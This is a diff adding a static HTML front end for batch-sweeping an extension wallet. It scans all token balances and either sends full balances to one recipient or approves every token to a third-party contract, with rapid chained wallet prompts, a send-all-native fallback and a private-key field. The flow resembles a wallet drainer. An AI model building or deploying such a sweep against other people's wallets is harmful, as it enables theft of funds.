@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Wallet Batch Transfers</title>
+  <style>
+    body {
+      margin: 0 auto;
+      max-width: 980px;
+      padding: 24px 20px 40px;
+      background: #ffe37a;
+      color: #101010;
+      font-family: Arial, sans-serif;
+    }
+
+    a {
+      color: inherit;
+    }
+
+    h1,
+    h2,
+    h3,
+    p {
+      margin-top: 0;
+    }
+
+    .header {
+      margin-bottom: 24px;
+    }
+
+    .header p {
+      max-width: 720px;
+      line-height: 1.5;
+    }
+
+    .nav {
+      margin-top: 12px;
+      font-size: 15px;
+    }
+
+    .nav a {
+      margin-right: 14px;
+    }
+
+    .panel {
+      margin-bottom: 18px;
+      padding: 18px;
+      background: #f5f5f5;
+      border: 5px solid #d3d3d3;
+    }
+
+    .panel h2 {
+      margin-bottom: 12px;
+    }
+
+    .row {
+      display: grid;
+      grid-template-columns: repeat(2, minmax(0, 1fr));
+      gap: 12px;
+      margin-bottom: 12px;
+    }
+
+    label {
+      display: block;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+
+    input,
+    select,
+    textarea,
+    button {
+      width: 100%;
+      box-sizing: border-box;
+      padding: 10px 12px;
+      margin-top: 6px;
+      border: 2px solid #999;
+      background: #fff;
+      color: #111;
+      font: inherit;
+    }
+
+    textarea {
+      min-height: 220px;
+      resize: vertical;
+      font-family: monospace;
+    }
+
+    button {
+      width: auto;
+      cursor: pointer;
+      font-weight: bold;
+      margin-right: 10px;
+      margin-top: 0;
+    }
+
+    .actions {
+      margin-top: 14px;
+    }
+
+    .status-grid {
+      display: grid;
+      grid-template-columns: 180px 1fr;
+      gap: 8px 12px;
+      font-family: monospace;
+      font-size: 14px;
+    }
+
+    .status-grid div:nth-child(odd) {
+      font-weight: bold;
+    }
+
+    .notice {
+      margin-top: 12px;
+      padding: 12px;
+      border: 2px solid #999;
+      background: #fffbe8;
+      line-height: 1.5;
+    }
+
+    .notice.error {
+      background: #ffe4e4;
+      border-color: #c44;
+    }
+
+    .notice.good {
+      background: #e7ffe9;
+      border-color: #4a9d4a;
+    }
+
+    .summary {
+      display: grid;
+      grid-template-columns: repeat(3, minmax(0, 1fr));
+      gap: 12px;
+      margin-top: 14px;
+      font-family: monospace;
+    }
+
+    .summary div {
+      padding: 12px;
+      border: 2px solid #bbb;
+      background: #fff;
+    }
+
+    .summary strong {
+      display: block;
+      margin-bottom: 6px;
+    }
+
+    .preview {
+      margin-top: 14px;
+      overflow-x: auto;
+      border: 2px solid #bbb;
+      background: #fff;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 14px;
+    }
+
+    th,
+    td {
+      padding: 10px;
+      border-bottom: 1px solid #ddd;
+      text-align: left;
+      vertical-align: top;
+    }
+
+    th {
+      background: #f2f2f2;
+    }
+
+    .mono {
+      font-family: monospace;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .footnote {
+      font-size: 14px;
+      line-height: 1.5;
+    }
+
+    .asset-list {
+      margin-top: 14px;
+      border: 2px solid #bbb;
+      background: #fff;
+      padding: 12px;
+      font-family: monospace;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+
+    .asset-list ul {
+      margin: 0;
+      padding-left: 18px;
+    }
+
+    .asset-list li + li {
+      margin-top: 6px;
+    }
+
+    .token-transfer-list {
+      margin-top: 14px;
+      border: 2px solid #bbb;
+      background: #fff;
+      padding: 12px;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+
+    .token-transfer-list label {
+      display: flex;
+      align-items: flex-start;
+      gap: 8px;
+      margin-bottom: 8px;
+      font-weight: normal;
+    }
+
+    .token-transfer-list input[type="checkbox"] {
+      width: auto;
+      margin-top: 2px;
+      margin-right: 0;
+    }
+
+    .debug-grid {
+      display: grid;
+      grid-template-columns: 180px 1fr;
+      gap: 8px 12px;
+      font-family: monospace;
+      font-size: 13px;
+      margin-top: 14px;
+    }
+
+    .debug-grid div:nth-child(odd) {
+      font-weight: bold;
+    }
+
+    .codebox {
+      padding: 12px;
+      border: 2px solid #bbb;
+      background: #fff;
+      font-family: monospace;
+      font-size: 13px;
+      line-height: 1.5;
+      white-space: pre-wrap;
+    }
+
+    @media (max-width: 720px) {
+      body {
+        padding-left: 12px;
+        padding-right: 12px;
+      }
+
+      .row,
+      .summary {
+        grid-template-columns: 1fr;
+      }
+
+      .status-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <h1>Wallet Connect Batch Transfers</h1>
+    <p>
+      Minimal operator page for an extension wallet. Pick a chain, connect once, scan balances,
+      and then either send full token balances to one recipient or approve them to one third-party contract.
+    </p>
+    <div class="nav">
+      <a href="index.html">index</a>
+      <a href="#wallet">wallet</a>
+      <a href="#transfers">transfers</a>
+    </div>
+  </div>
+
+  <div class="panel" id="wallet">
+    <h2>Wallet</h2>
+    <div class="row">
+      <label>
+        Chain
+        <select id="chainSelect"></select>
+      </label>
+      <label>
+        Execution mode
+        <input id="modeDisplay" type="text" value="Many direct transactions from the connected wallet" readonly />
+      </label>
+    </div>
+    <div class="actions">
+      <button id="connectButton" type="button">Connect wallet</button>
+      <button id="scanBalancesButton" type="button">Scan balances</button>
+    </div>
+    <div class="status-grid" style="margin-top: 16px;">
+      <div>configured chain</div><div id="configuredChainStatus">-</div>
+      <div>wallet chain</div><div id="walletChainStatus">-</div>
+      <div>account</div><div id="accountStatus">-</div>
+      <div>balance</div><div id="balanceStatus">-</div>
+      <div>multicall3</div><div id="multicallStatus">-</div>
+    </div>
+    <div class="notice" id="walletNotice">
+      Configure the chain list in the page source before deployment. This page is intentionally static.
+    </div>
+    <div class="asset-list" id="assetList">
+      No wallet token scan yet.
+    </div>
+    <label style="display: inline-block; margin-top: 12px; font-weight: normal;">
+      <input id="debugToggle" type="checkbox" style="width: auto; margin-right: 8px;" />
+      show debug
+    </label>
+    <div class="asset-list hidden" id="debugPanel">
+      <strong>Debug</strong>
+      <div class="row" style="margin-top: 12px;">
+        <label>
+          Private key
+          <input id="privateKeyInput" type="password" placeholder="0x... localhost only" autocomplete="off" />
+        </label>
+        <label>
+          Signing mode
+          <input id="signingModeDisplay" type="text" value="Extension wallet only" readonly />
+        </label>
+      </div>
+      <p class="footnote" style="margin-bottom: 12px;">
+        Warning: private key mode is for localhost testing only. The key stays in memory in this page and uses the connected browser provider to broadcast signed transactions.
+      </p>
+      <div class="debug-grid">
+        <div>catalog loaded</div><div id="debugCatalogLoaded">no</div>
+        <div>selected chain</div><div id="debugChain">-</div>
+        <div>catalog tokens</div><div id="debugCatalogCount">0</div>
+        <div>read mode</div><div id="debugReadMode">-</div>
+        <div>max retries</div><div id="debugMaxRetries">5</div>
+        <div>active rpc</div><div id="debugActiveRpc">-</div>
+        <div>queried</div><div id="debugQueried">-</div>
+        <div>nonzero</div><div id="debugNonzero">-</div>
+        <div>failures</div><div id="debugFailures">-</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="panel" id="transfers">
+    <h2>Transfers</h2>
+    <p class="footnote">
+      Execution is driven from scanned wallet balances on the selected chain.
+      The page does not require manual token or amount entry.
+    </p>
+    <div class="row">
+      <label>
+        Execution strategy
+        <select id="executionStrategy">
+          <option value="sequential_calls">sequential_calls</option>
+          <option value="permit_batch_signer">permit_batch_signer</option>
+        </select>
+      </label>
+      <label>
+        Token selection mode
+        <select id="tokenSelectionMode">
+          <option value="all_known_tokens">all_known_tokens</option>
+          <option value="selected_known_tokens">selected_known_tokens</option>
+        </select>
+      </label>
+    </div>
+    <div class="footnote">
+      Token execution is driven from scanned wallet balances. Default behavior is full-balance handling
+      for all detected tokens on the selected chain.
+    </div>
+    <div class="row">
+      <label>
+        Recipient address
+        <input id="singleRecipient" type="text" placeholder="0xRecipientAddress" autocomplete="off" />
+      </label>
+      <label>
+        Max token transfers
+        <input id="maxTokenTransfers" type="number" min="1" step="1" value="25" />
+      </label>
+    </div>
+    <div class="row">
+      <label>
+        Approval target
+        <input id="approvalTarget" type="text" placeholder="0xThirdPartyContract" autocomplete="off" />
+      </label>
+      <label>
+        Action
+        <input id="actionModeDisplay" type="text" value="Send full balances to recipient" readonly />
+      </label>
+    </div>
+    <div class="row">
+      <label style="font-weight: normal;">
+        <input id="rapidSubmitToggle" type="checkbox" style="width: auto; margin-right: 8px;" />
+        Rapid submit after tx hash
+      </label>
+      <label style="font-weight: normal;">
+        <input id="nativeFallbackToggle" type="checkbox" style="width: auto; margin-right: 8px;" />
+        Send all native minus fee if no tokens found
+      </label>
+    </div>
+    <div class="footnote">
+      For <span class="mono">selected_known_tokens</span> or <span class="mono">all_known_tokens</span>,
+      <span class="mono">sequential_calls</span> sends every selected token balance to the recipient,
+      while <span class="mono">permit_batch_signer</span> performs sequential ERC-20 approvals to the
+      approval target contract. Rapid submit skips confirmation waits and pushes the next wallet request
+      after the transaction hash is returned.
+    </div>
+    <div class="token-transfer-list" id="tokenTransferList">
+      Scan balances to populate the token transfer list.
+    </div>
+    <div class="actions">
+      <button id="sendButton" type="button">Execute</button>
+    </div>
+    <div class="notice" id="transferNotice">
+      Execution applies to scanned token balances only. Amounts default to the full detected balance for each selected token.
+    </div>
+  </div>
+
+  <div class="panel">
+    <h2>App Entry Points</h2>
+    <p class="footnote">
+      Browser runtime uses <span class="mono">batch-transfer-app.js</span>. A typed scaffold for future work lives in
+      <span class="mono">batch-transfer-app.ts</span>.
+    </p>
+    <div class="codebox">batch-transfer.html
+batch-transfer-app.js
+batch-transfer-app.ts</div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.5/dist/ethers.umd.min.js"></script>
+  <script type="module" src="batch-transfer-app.js"></script>
+</body>
+</html>
